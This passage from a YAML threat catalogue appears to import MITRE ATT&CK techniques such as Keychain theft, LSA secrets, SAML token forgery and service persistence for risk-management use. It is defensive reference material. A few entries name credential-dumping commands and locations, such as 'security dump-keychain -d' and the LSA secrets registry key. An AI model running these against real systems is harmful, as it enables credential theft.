      \ to .ost, whereas IMAP accounts in Outlook 2016 (and later) use .ost files.\
      \ Both types of Outlook data files are typically stored in `C:\\Users\\<username>\\\
      Documents\\Outlook Files` or `C:\\Users\\<username>\\AppData\\Local\\Microsoft\\\
      Outlook`.(Citation: Microsoft Outlook Files)\nhttps://attack.mitre.org/techniques/T1114/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1555.001
    ref_id: T1555.001
    name: Keychain
    description: "Adversaries may acquire credentials from Keychain. Keychain (or\
      \ Keychain Services) is the macOS credential management system that stores account\
      \ names, passwords, private keys, certificates, sensitive application data,\
      \ payment data, and secure notes. There are three types of Keychains: Login\
      \ Keychain, System Keychain, and Local Items (iCloud) Keychain. The default\
      \ Keychain is the Login Keychain, which stores user passwords and information.\
      \ The System Keychain stores items accessed by the operating system, such as\
      \ items shared among users on a host. The Local Items (iCloud) Keychain is used\
      \ for items synced with Apple\u2019s iCloud service. \n\nKeychains can be viewed\
      \ and edited through the Keychain Access application or using the command-line\
      \ utility <code>security</code>. Keychain files are located in <code>~/Library/Keychains/</code>,\
      \ <code>/Library/Keychains/</code>, and <code>/Network/Library/Keychains/</code>.(Citation:\
      \ Keychain Services Apple)(Citation: Keychain Decryption Passware)(Citation:\
      \ OSX Keychain Schaumann)\n\nAdversaries may gather user credentials from Keychain\
      \ storage/memory. For example, the command <code>security dump-keychain \u2013\
      d</code> will dump all Login Keychain credentials from <code>~/Library/Keychains/login.keychain-db</code>.\
      \ Adversaries may also directly read Login Keychain credentials from the <code>~/Library/Keychains/login.keychain</code>\
      \ file. Both methods require a password, where the default password for the\
      \ Login Keychain is the current user\u2019s password to login to the macOS host.(Citation:\
      \ External to DA, the OS X Way)(Citation: Empire Keychain Decrypt)\nhttps://attack.mitre.org/techniques/T1555/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1547
    ref_id: T1547
    name: Boot or Logon Autostart Execution
    description: 'Adversaries may configure system settings to automatically execute
      a program during system boot or logon to maintain persistence or gain higher-level
      privileges on compromised systems. Operating systems may have mechanisms for
      automatically running a program on system boot or account logon.(Citation: Microsoft
      Run Key)(Citation: MSDN Authentication Packages)(Citation: Microsoft TimeProvider)(Citation:
      Cylance Reg Persistence Sept 2013)(Citation: Linux Kernel Programming) These
      mechanisms may include automatically executing programs that are placed in specially
      designated directories or are referenced by repositories that store configuration
      information, such as the Windows Registry. An adversary may achieve the same
      goal by modifying or extending features of the kernel.


      Since some boot or logon autostart programs run with higher privileges, an adversary
      may leverage these to elevate privileges.

      https://attack.mitre.org/techniques/T1547'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1003.004
    ref_id: T1003.004
    name: LSA Secrets
    description: 'Adversaries with SYSTEM access to a host may attempt to access Local
      Security Authority (LSA) secrets, which can contain a variety of different credential
      materials, such as credentials for service accounts.(Citation: Passcape LSA
      Secrets)(Citation: Microsoft AD Admin Tier Model)(Citation: Tilbury Windows
      Credentials) LSA secrets are stored in the registry at <code>HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets</code>.
      LSA secrets can also be dumped from memory.(Citation: ired Dumping LSA Secrets)


      [Reg](https://attack.mitre.org/software/S0075) can be used to extract from the
      Registry. [Mimikatz](https://attack.mitre.org/software/S0002) can be used to
      extract secrets from memory.(Citation: ired Dumping LSA Secrets)

      https://attack.mitre.org/techniques/T1003/004'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1600
    ref_id: T1600
    name: Weaken Encryption
    description: "Adversaries may compromise a network device\u2019s encryption capability\
      \ in order to bypass encryption that would otherwise protect data communications.\
      \ (Citation: Cisco Synful Knock Evolution)\n\nEncryption can be used to protect\
      \ transmitted network traffic to maintain its confidentiality (protect against\
      \ unauthorized disclosure) and integrity (protect against unauthorized changes).\
      \ Encryption ciphers are used to convert a plaintext message to ciphertext and\
      \ can be computationally intensive to decipher without the associated decryption\
      \ key. Typically, longer keys increase the cost of cryptanalysis, or decryption\
      \ without the key.\n\nAdversaries can compromise and manipulate devices that\
      \ perform encryption of network traffic. For example, through behaviors such\
      \ as [Modify System Image](https://attack.mitre.org/techniques/T1601), [Reduce\
      \ Key Space](https://attack.mitre.org/techniques/T1600/001), and [Disable Crypto\
      \ Hardware](https://attack.mitre.org/techniques/T1600/002), an adversary can\
      \ negatively effect and/or eliminate a device\u2019s ability to securely encrypt\
      \ network traffic. This poses a greater risk of unauthorized disclosure and\
      \ may help facilitate data manipulation, Credential Access, or Collection efforts.\
      \ (Citation: Cisco Blog Legacy Device Attacks)\nhttps://attack.mitre.org/techniques/T1600"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1606.002
    ref_id: T1606.002
    name: SAML Tokens
    description: 'An adversary may forge SAML tokens with any permissions claims and
      lifetimes if they possess a valid SAML token-signing certificate.(Citation:
      Microsoft SolarWinds Steps) The default lifetime of a SAML token is one hour,
      but the validity period can be specified in the <code>NotOnOrAfter</code> value
      of the <code>conditions ...</code> element in a token. This value can be changed
      using the <code>AccessTokenLifetime</code> in a <code>LifetimeTokenPolicy</code>.(Citation:
      Microsoft SAML Token Lifetimes) Forged SAML tokens enable adversaries to authenticate
      across services that use SAML 2.0 as an SSO (single sign-on) mechanism.(Citation:
      Cyberark Golden SAML)


      An adversary may utilize [Private Keys](https://attack.mitre.org/techniques/T1552/004)
      to compromise an organization''s token-signing certificate to create forged
      SAML tokens. If the adversary has sufficient permissions to establish a new
      federation trust with their own Active Directory Federation Services (AD FS)
      server, they may instead generate their own trusted token-signing certificate.(Citation:
      Microsoft SolarWinds Customer Guidance) This differs from [Steal Application
      Access Token](https://attack.mitre.org/techniques/T1528) and other similar behaviors
      in that the tokens are new and forged by the adversary, rather than stolen or
      intercepted from legitimate users.


      An adversary may gain administrative Entra ID privileges if a SAML token is
      forged which claims to represent a highly privileged account. This may lead
      to [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550),
      which may bypass multi-factor and other authentication protection mechanisms.(Citation:
      Microsoft SolarWinds Customer Guidance)

      https://attack.mitre.org/techniques/T1606/002'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1036.008
    ref_id: T1036.008
    name: Masquerade File Type
    description: "Adversaries may masquerade malicious payloads as legitimate files\
      \ through changes to the payload's formatting, including the file\u2019s signature,\
      \ extension, and contents. Various file types have a typical standard format,\
      \ including how they are encoded and organized. For example, a file\u2019s signature\
      \ (also known as header or magic bytes) is the beginning bytes of a file and\
      \ is often used to identify the file\u2019s type. For example, the header of\
      \ a JPEG file,  is <code> 0xFF 0xD8</code> and the file extension is either\
      \ `.JPE`, `.JPEG` or `.JPG`. \n\nAdversaries may edit the header\u2019s hex\
      \ code and/or the file extension of a malicious payload in order to bypass file\
      \ validation checks and/or input sanitization. This behavior is commonly used\
      \ when payload files are transferred (e.g., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105))\
      \ and stored (e.g., [Upload Malware](https://attack.mitre.org/techniques/T1608/001))\
      \ so that adversaries may move their malware without triggering detections.\
      \ \n\nCommon non-executable file types and extensions, such as text files (`.txt`)\
      \ and image files (`.jpg`, `.gif`, etc.) may be typically treated as benign.\
      \  Based on this, adversaries may use a file extension to disguise malware,\
      \ such as naming a PHP backdoor code with a file name of <code>test.gif</code>.\
      \ A user may not know that a file is malicious due to the benign appearance\
      \ and file extension.\n\nPolygot files, which are files that have multiple different\
      \ file types and that function differently based on the application that will\
      \ execute them, may also be used to disguise malicious malware and capabilities.(Citation:\
      \ polygot_icedID)\nhttps://attack.mitre.org/techniques/T1036/008"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1489
    ref_id: T1489
    name: Service Stop
    description: "Adversaries may stop or disable services on a system to render those\
      \ services unavailable to legitimate users. Stopping critical services or processes\
      \ can inhibit or stop response to an incident or aid in the adversary's overall\
      \ objectives to cause damage to the environment.(Citation: Talos Olympic Destroyer\
      \ 2018)(Citation: Novetta Blockbuster) \n\nAdversaries may accomplish this by\
      \ disabling individual services of high importance to an organization, such\
      \ as <code>MSExchangeIS</code>, which will make Exchange content inaccessible.(Citation:\
      \ Novetta Blockbuster) In some cases, adversaries may stop or disable many or\
      \ all services to render systems unusable.(Citation: Talos Olympic Destroyer\
      \ 2018) Services or processes may not allow for modification of their data stores\
      \ while running. Adversaries may stop services or processes in order to conduct\
      \ [Data Destruction](https://attack.mitre.org/techniques/T1485) or [Data Encrypted\
      \ for Impact](https://attack.mitre.org/techniques/T1486) on the data stores\
      \ of services like Exchange and SQL Server.(Citation: SecureWorks WannaCry Analysis)\n\
      https://attack.mitre.org/techniques/T1489"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1587.001
    ref_id: T1587.001
    name: Malware
    description: 'Adversaries may develop malware and malware components that can
      be used during targeting. Building malicious software can include the development
      of payloads, droppers, post-compromise tools, backdoors (including backdoored
      images), packers, C2 protocols, and the creation of infected removable media.
      Adversaries may develop malware to support their operations, creating a means
      for maintaining control of remote machines, evading defenses, and executing
      post-compromise behaviors.(Citation: Mandiant APT1)(Citation: Kaspersky Sofacy)(Citation:
      ActiveMalwareEnergy)(Citation: FBI Flash FIN7 USB)


      As with legitimate development efforts, different skill sets may be required
      for developing malware. The skills needed may be located in-house, or may need
      to be contracted out. Use of a contractor may be considered an extension of
      that adversary''s malware development capabilities, provided the adversary plays
      a role in shaping requirements and maintains a degree of exclusivity to the
      malware.


      Some aspects of malware development, such as C2 protocol development, may require
      adversaries to obtain additional infrastructure. For example, malware developed
      that will communicate with Twitter for C2, may require use of [Web Services](https://attack.mitre.org/techniques/T1583/006).(Citation:
      FireEye APT29)

      https://attack.mitre.org/techniques/T1587/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1652
    ref_id: T1652
    name: Device Driver Discovery
    description: 'Adversaries may attempt to enumerate local device drivers on a victim
      host. Information about device drivers may highlight various insights that shape
      follow-on behaviors, such as the function/purpose of the host, present security
      tools (i.e. [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001))
      or other defenses (e.g., [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497)),
      as well as potential exploitable vulnerabilities (e.g., [Exploitation for Privilege
      Escalation](https://attack.mitre.org/techniques/T1068)).


      Many OS utilities may provide information about local device drivers, such as
      `driverquery.exe` and the `EnumDeviceDrivers()` API function on Windows.(Citation:
      Microsoft Driverquery)(Citation: Microsoft EnumDeviceDrivers) Information about
      device drivers (as well as associated services, i.e., [System Service Discovery](https://attack.mitre.org/techniques/T1007))
      may also be available in the Registry.(Citation: Microsoft Registry Drivers)


      On Linux/macOS, device drivers (in the form of kernel modules) may be visible
      within `/dev` or using utilities such as `lsmod` and `modinfo`.(Citation: Linux
      Kernel Programming)(Citation: lsmod man)(Citation: modinfo man)

      https://attack.mitre.org/techniques/T1652'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1087.002
    ref_id: T1087.002
    name: Domain Account
    description: 'Adversaries may attempt to get a listing of domain accounts. This
      information can help adversaries determine which domain accounts exist to aid
      in follow-on behavior such as targeting specific accounts which possess particular
      privileges.


      Commands such as <code>net user /domain</code> and <code>net group /domain</code>
      of the [Net](https://attack.mitre.org/software/S0039) utility, <code>dscacheutil
      -q group</code> on macOS, and <code>ldapsearch</code> on Linux can list domain
      users and groups. [PowerShell](https://attack.mitre.org/techniques/T1059/001)
      cmdlets including <code>Get-ADUser</code> and <code>Get-ADGroupMember</code>
      may enumerate members of Active Directory groups.(Citation: CrowdStrike StellarParticle
      January 2022)

      https://attack.mitre.org/techniques/T1087/002'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1547.014
    ref_id: T1547.014
    name: Active Setup
    description: 'Adversaries may achieve persistence by adding a Registry key to
      the Active Setup of the local machine. Active Setup is a Windows mechanism that
      is used to execute programs when a user logs in. The value stored in the Registry
      key will be executed after a user logs into the computer.(Citation: Klein Active
      Setup 2010) These programs will be executed under the context of the user and
      will have the account''s associated permissions level.


      Adversaries may abuse Active Setup by creating a key under <code> HKLM\SOFTWARE\Microsoft\Active
      Setup\Installed Components\</code> and setting a malicious value for <code>StubPath</code>.
      This value will serve as the program that will be executed when a user logs
      into the computer.(Citation: Mandiant Glyer APT 2010)(Citation: Citizenlab Packrat
      2015)(Citation: FireEye CFR Watering Hole 2012)(Citation: SECURELIST Bright
      Star 2015)(Citation: paloalto Tropic Trooper 2016)


      Adversaries can abuse these components to execute malware, such as remote access
      tools, to maintain persistence through system reboots. Adversaries may also
      use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry
      entries look as if they are associated with legitimate programs.

      https://attack.mitre.org/techniques/T1547/014'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1564
    ref_id: T1564
    name: Hide Artifacts
    description: 'Adversaries may attempt to hide artifacts associated with their
      behaviors to evade detection. Operating systems may have features to hide various
      artifacts, such as important system files and administrative task execution,
      to avoid disrupting user work environments and prevent users from changing files
      or features on the system. Adversaries may abuse these features to hide artifacts
      such as files, directories, user accounts, or other system activity to evade
      detection.(Citation: Sofacy Komplex Trojan)(Citation: Cybereason OSX Pirrit)(Citation:
      MalwareBytes ADS July 2015)


      Adversaries may also attempt to hide artifacts associated with malicious behavior
      by creating computing regions that are isolated from common security instrumentation,
      such as through the use of virtualization technology.(Citation: Sophos Ragnar
      May 2020)

      https://attack.mitre.org/techniques/T1564'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1559.002
    ref_id: T1559.002
    name: Dynamic Data Exchange
    description: 'Adversaries may use Windows Dynamic Data Exchange (DDE) to execute
      arbitrary commands. DDE is a client-server protocol for one-time and/or continuous
      inter-process communication (IPC) between applications. Once a link is established,
      applications can autonomously exchange transactions consisting of strings, warm
      data links (notifications when a data item changes), hot data links (duplications
      of changes to a data item), and requests for command execution.


      Object Linking and Embedding (OLE), or the ability to link data between documents,
      was originally implemented through DDE. Despite being superseded by [Component
      Object Model](https://attack.mitre.org/techniques/T1559/001), DDE may be enabled
      in Windows 10 and most of Microsoft Office 2016 via Registry keys.(Citation:
      BleepingComputer DDE Disabled in Word Dec 2017)(Citation: Microsoft ADV170021
      Dec 2017)(Citation: Microsoft DDE Advisory Nov 2017)


      Microsoft Office documents can be poisoned with DDE commands, directly or through
      embedded files, and used to deliver execution via [Phishing](https://attack.mitre.org/techniques/T1566)
      campaigns or hosted Web content, avoiding the use of Visual Basic for Applications
      (VBA) macros.(Citation: SensePost PS DDE May 2016)(Citation: Kettle CSV DDE
      Aug 2014)(Citation: Enigma Reviving DDE Jan 2018)(Citation: SensePost MacroLess
      DDE Oct 2017) Similarly, adversaries may infect payloads to execute applications
      and/or commands on a victim device by way of embedding DDE formulas within a
      CSV file intended to be opened through a Windows spreadsheet program.(Citation:
      OWASP CSV Injection)(Citation: CSV Excel Macro Injection )


      DDE could also be leveraged by an adversary operating on a compromised machine
      who does not have direct access to a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).
      DDE execution can be invoked remotely via [Remote Services](https://attack.mitre.org/techniques/T1021)
      such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003)
      (DCOM).(Citation: Fireeye Hunting COM June 2019)

      https://attack.mitre.org/techniques/T1559/002'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1204.002
    ref_id: T1204.002
    name: Malicious File
    description: "An adversary may rely upon a user opening a malicious file in order\
      \ to gain execution. Users may be subjected to social engineering to get them\
      \ to open a file that will lead to code execution. This user action will typically\
      \ be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001).\
      \ Adversaries may use several types of files that require a user to execute\
      \ them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, .cpl, and\
      \ .reg.\n\nAdversaries may employ various forms of [Masquerading](https://attack.mitre.org/techniques/T1036)\
      \ and [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027)\
      \ to increase the likelihood that a user will open and successfully execute\
      \ a malicious file. These methods may include using a familiar naming convention\
      \ and/or password protecting the file and supplying instructions to a user on\
      \ how to open it.(Citation: Password Protected Word Docs) \n\nWhile [Malicious\
      \ File](https://attack.mitre.org/techniques/T1204/002) frequently occurs shortly\
      \ after Initial Access it may occur at other phases of an intrusion, such as\
      \ when an adversary places a file in a shared directory or on a user's desktop\
      \ hoping that a user will click on it. This activity may also be seen shortly\
      \ after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).\n\
      https://attack.mitre.org/techniques/T1204/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1591.003
    ref_id: T1591.003
    name: Identify Business Tempo
    description: "Adversaries may gather information about the victim's business tempo\
      \ that can be used during targeting. Information about an organization\u2019\
      s business tempo may include a variety of details, including operational hours/days\
      \ of the week. This information may also reveal times/dates of purchases and\
      \ shipments of the victim\u2019s hardware and software resources.\n\nAdversaries\
      \ may gather this information in various ways, such as direct elicitation via\
      \ [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information\
      \ about business tempo may also be exposed to adversaries via online or other\
      \ accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001)\
      \ or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation:\
      \ ThreatPost Broadvoice Leak) Gathering this information may reveal opportunities\
      \ for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598)\
      \ or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)),\
      \ establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585)\
      \ or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or\
      \ initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195)\
      \ or [Trusted Relationship](https://attack.mitre.org/techniques/T1199))\nhttps://attack.mitre.org/techniques/T1591/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1071.005
    ref_id: T1071.005
    name: Publish/Subscribe Protocols
    description: "Adversaries may communicate using publish/subscribe (pub/sub) application\
      \ layer protocols to avoid detection/network filtering by blending in with existing\
      \ traffic. Commands to the remote system, and often the results of those commands,\
      \ will be embedded within the protocol traffic between the client and server.\
      \ \n\nProtocols such as <code>MQTT</code>, <code>XMPP</code>, <code>AMQP</code>,\
      \ and <code>STOMP</code> use a publish/subscribe design, with message distribution\
      \ managed by a centralized broker.(Citation: wailing crab sub/pub)(Citation:\
      \ Mandiant APT1 Appendix) Publishers categorize their messages by topics, while\
      \ subscribers receive messages according to their subscribed topics.(Citation:\
      \ wailing crab sub/pub) An adversary may abuse publish/subscribe protocols to\
      \ communicate with systems under their control from behind a message broker\
      \ while also mimicking normal, expected traffic.\nhttps://attack.mitre.org/techniques/T1071/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1592.001
    ref_id: T1592.001
    name: Hardware
    description: 'Adversaries may gather information about the victim''s host hardware
      that can be used during targeting. Information about hardware infrastructure
      may include a variety of details such as types and versions on specific hosts,
      as well as the presence of additional components that might be indicative of
      added defensive protections (ex: card/biometric readers, dedicated encryption
      hardware, etc.).


      Adversaries may gather this information in various ways, such as direct collection
      actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) (ex:
      hostnames, server banners, user agent strings) or [Phishing for Information](https://attack.mitre.org/techniques/T1598).
      Adversaries may also compromise sites then include malicious content designed
      to collect host information from visitors.(Citation: ATT ScanBox) Information
      about the hardware infrastructure may also be exposed to adversaries via online
      or other accessible data sets (ex: job postings, network maps, assessment reports,
      resumes, or purchase invoices). Gathering this information may reveal opportunities
      for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)
      or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)),
      establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587)
      or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or
      initial access (ex: [Compromise Hardware Supply Chain](https://attack.mitre.org/techniques/T1195/003)
      or [Hardware Additions](https://attack.mitre.org/techniques/T1200)).

      https://attack.mitre.org/techniques/T1592/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1080
    ref_id: T1080
    name: Taint Shared Content
    description: 'Adversaries may deliver payloads to remote systems by adding content
      to shared storage locations, such as network drives or internal code repositories.
      Content stored on network drives or in other shared locations may be tainted
      by adding malicious programs, scripts, or exploit code to otherwise valid files.
      Once a user opens the shared tainted content, the malicious portion can be executed
      to run the adversary''s code on a remote system. Adversaries may use tainted
      shared content to move laterally.


      A directory share pivot is a variation on this technique that uses several other
      techniques to propagate malware when users access a shared network directory.
      It uses [Shortcut Modification](https://attack.mitre.org/techniques/T1547/009)
      of directory .LNK files that use [Masquerading](https://attack.mitre.org/techniques/T1036)
      to look like the real directories, which are hidden through [Hidden Files and
      Directories](https://attack.mitre.org/techniques/T1564/001). The malicious .LNK-based
      directories have an embedded command that executes the hidden malware file in
      the directory and then opens the real intended directory so that the user''s
      expected action still occurs. When used with frequently used network directories,
      the technique may result in frequent reinfections and broad access to systems
      and potentially to new and higher privileged accounts. (Citation: Retwin Directory
      Share Pivot)


      Adversaries may also compromise shared network directories through binary infections
      by appending or prepending its code to the healthy binary on the shared network
      directory. The malware may modify the original entry point (OEP) of the healthy
      binary to ensure that it is executed before the legitimate code. The infection
      could continue to spread via the newly infected file when it is executed by
      a remote system. These infections may target both binary and non-binary formats
      that end with extensions including, but not limited to, .EXE, .DLL, .SCR, .BAT,
      and/or .VBS.

      https://attack.mitre.org/techniques/T1080'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1484.002
    ref_id: T1484.002
    name: Trust Modification
    description: "Adversaries may add new domain trusts, modify the properties of\
      \ existing domain trusts, or otherwise change the configuration of trust relationships\
      \ between domains and tenants to evade defenses and/or elevate privileges.Trust\
      \ details, such as whether or not user identities are federated, allow authentication\
      \ and authorization properties to apply between domains or tenants for the purpose\
      \ of accessing shared resources.(Citation: Microsoft - Azure AD Federation)\
      \ These trust objects may include accounts, credentials, and other authentication\
      \ material applied to servers, tokens, and domains.\n\nManipulating these trusts\
      \ may allow an adversary to escalate privileges and/or evade defenses by modifying\
      \ settings to add objects which they control. For example, in Microsoft Active\
      \ Directory (AD) environments, this may be used to forge [SAML Tokens](https://attack.mitre.org/techniques/T1606/002)\
      \ without the need to compromise the signing certificate to forge new credentials.\
      \ Instead, an adversary can manipulate domain trusts to add their own signing\
      \ certificate. An adversary may also convert an AD domain to a federated domain\
      \ using Active Directory Federation Services (AD FS), which may enable malicious\
      \ trust modifications such as altering the claim issuance rules to log in any\
      \ valid set of credentials as a specified user.(Citation: AADInternals zure\
      \ AD Federated Domain) \n\nAn adversary may also add a new federated identity\
      \ provider to an identity tenant such as Okta or AWS IAM Identity Center, which\
      \ may enable the adversary to authenticate as any user of the tenant.(Citation:\
      \ Okta Cross-Tenant Impersonation 2023) This may enable the threat actor to\
      \ gain broad access into a variety of cloud-based services that leverage the\
      \ identity tenant. For example, in AWS environments, an adversary that creates\
      \ a new identity provider for an AWS Organization will be able to federate into\
      \ all of the AWS Organization member accounts without creating identities for\
      \ each of the member accounts.(Citation: AWS RE:Inforce Threat Detection 2024)\n\
      https://attack.mitre.org/techniques/T1484/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1573.001
    ref_id: T1573.001
    name: Symmetric Cryptography
    description: 'Adversaries may employ a known symmetric encryption algorithm to
      conceal command and control traffic rather than relying on any inherent protections
      provided by a communication protocol. Symmetric encryption algorithms use the
      same key for plaintext encryption and ciphertext decryption. Common symmetric
      encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.

      https://attack.mitre.org/techniques/T1573/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1087.001
    ref_id: T1087.001
    name: Local Account
    description: 'Adversaries may attempt to get a listing of local system accounts.
      This information can help adversaries determine which local accounts exist on
      a system to aid in follow-on behavior.


      Commands such as <code>net user</code> and <code>net localgroup</code> of the
      [Net](https://attack.mitre.org/software/S0039) utility and <code>id</code> and
      <code>groups</code> on macOS and Linux can list local users and groups.(Citation:
      Mandiant APT1)(Citation: id man page)(Citation: groups man page) On Linux, local
      users can also be enumerated through the use of the <code>/etc/passwd</code>
      file. On macOS the <code>dscl . list /Users</code> command can be used to enumerate
      local accounts.

      https://attack.mitre.org/techniques/T1087/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1586.001
    ref_id: T1586.001
    name: Social Media Accounts
    description: "Adversaries may compromise social media accounts that can be used\
      \ during targeting. For operations incorporating social engineering, the utilization\
      \ of an online persona may be important. Rather than creating and cultivating\
      \ social media profiles (i.e. [Social Media Accounts](https://attack.mitre.org/techniques/T1585/001)),\
      \ adversaries may compromise existing social media accounts. Utilizing an existing\
      \ persona may engender a level of trust in a potential victim if they have a\
      \ relationship, or knowledge of, the compromised persona. \n\nA variety of methods\
      \ exist for compromising social media accounts, such as gathering credentials\
      \ via [Phishing for Information](https://attack.mitre.org/techniques/T1598),\
      \ purchasing credentials from third-party sites, or by brute forcing credentials\
      \ (ex: password reuse from breach credential dumps).(Citation: AnonHBGary) Prior\
      \ to compromising social media accounts, adversaries may conduct Reconnaissance\
      \ to inform decisions about which accounts to compromise to further their operation.\n\
      \nPersonas may exist on a single site or across multiple sites (ex: Facebook,\
      \ LinkedIn, Twitter, etc.). Compromised social media accounts may require additional\
      \ development, this could include filling out or modifying profile information,\
      \ further developing social networks, or incorporating photos.\n\nAdversaries\
      \ can use a compromised social media profile to create new, or hijack existing,\
      \ connections to targets of interest. These connections may be direct or may\
      \ include trying to connect through others.(Citation: NEWSCASTER2014)(Citation:\
      \ BlackHatRobinSage) Compromised profiles may be leveraged during other phases\
      \ of the adversary lifecycle, such as during Initial Access (ex: [Spearphishing\
      \ via Service](https://attack.mitre.org/techniques/T1566/003)).\nhttps://attack.mitre.org/techniques/T1586/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1562.009
    ref_id: T1562.009
    name: Safe Mode Boot
    description: 'Adversaries may abuse Windows safe mode to disable endpoint defenses.
      Safe mode starts up the Windows operating system with a limited set of drivers
      and services. Third-party security software such as endpoint detection and response
      (EDR) tools may not start after booting Windows in safe mode. There are two
      versions of safe mode: Safe Mode and Safe Mode with Networking. It is possible
      to start additional services after a safe mode boot.(Citation: Microsoft Safe
      Mode)(Citation: Sophos Snatch Ransomware 2019)


      Adversaries may abuse safe mode to disable endpoint defenses that may not start
      with a limited boot. Hosts can be forced into safe mode after the next reboot
      via modifications to Boot Configuration Data (BCD) stores, which are files that
      manage boot application settings.(Citation: Microsoft bcdedit 2021)


      Adversaries may also add their malicious applications to the list of minimal
      services that start in safe mode by modifying relevant Registry values (i.e.
      [Modify Registry](https://attack.mitre.org/techniques/T1112)). Malicious [Component
      Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) objects may
      also be registered and loaded in safe mode.(Citation: Sophos Snatch Ransomware
      2019)(Citation: CyberArk Labs Safe Mode 2016)(Citation: Cybereason Nocturnus
      MedusaLocker 2020)(Citation: BleepingComputer REvil 2021)

      https://attack.mitre.org/techniques/T1562/009'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1542.005
    ref_id: T1542.005
    name: TFTP Boot
    description: 'Adversaries may abuse netbooting to load an unauthorized network
      device operating system from a Trivial File Transfer Protocol (TFTP) server.
      TFTP boot (netbooting) is commonly used by network administrators to load configuration-controlled
      network device images from a centralized management server. Netbooting is one
      option in the boot sequence and can be used to centralize, manage, and control
      device images.


      Adversaries may manipulate the configuration on the network device specifying
      use of a malicious TFTP server, which may be used in conjunction with [Modify
      System Image](https://attack.mitre.org/techniques/T1601) to load a modified
      image on device startup or reset. The unauthorized image allows adversaries
      to modify device configuration, add malicious capabilities to the device, and
      introduce backdoors to maintain control of the network device while minimizing
      detection through use of a standard functionality. This technique is similar
      to [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) and may result
      in the network device running a modified image. (Citation: Cisco Blog Legacy
      Device Attacks)

      https://attack.mitre.org/techniques/T1542/005'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1543.003
    ref_id: T1543.003
    name: Windows Service
    description: "Adversaries may create or modify Windows services to repeatedly\
      \ execute malicious payloads as part of persistence. When Windows boots up,\
      \ it starts programs or applications called services that perform background\
      \ system functions.(Citation: TechNet Services) Windows service configuration\
      \ information, including the file path to the service's executable or recovery\
      \ programs/commands, is stored in the Windows Registry.\n\nAdversaries may install\
      \ a new service or modify an existing service to execute at startup in order\
      \ to persist on a system. Service configurations can be set or modified using\
      \ system utilities (such as sc.exe), by directly modifying the Registry, or\
      \ by interacting directly with the Windows API. \n\nAdversaries may also use\
      \ services to install and execute malicious drivers. For example, after dropping\
      \ a driver file (ex: `.sys`) to disk, the payload can be loaded and registered\
      \ via [Native API](https://attack.mitre.org/techniques/T1106) functions such\
      \ as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()`\
      \ and `ZwSetValueKey()`), by creating the required service Registry values (i.e.\
      \ [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using\
      \ command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet\
      \ Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42\
      \ AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s\
      \ to hide the presence of malicious activity on a system. Adversaries may also\
      \ load a signed yet vulnerable driver onto a compromised machine (known as \"\
      Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege\
      \ Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole\
      \ June 2020)(Citation: Unit42 AcidBox June 2020)\n\nServices may be created\
      \ with administrator privileges but are executed under SYSTEM privileges, so\
      \ an adversary may also use a service to escalate privileges. Adversaries may\
      \ also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002).\n\
      \nTo make detection analysis more challenging, malicious services may also incorporate\
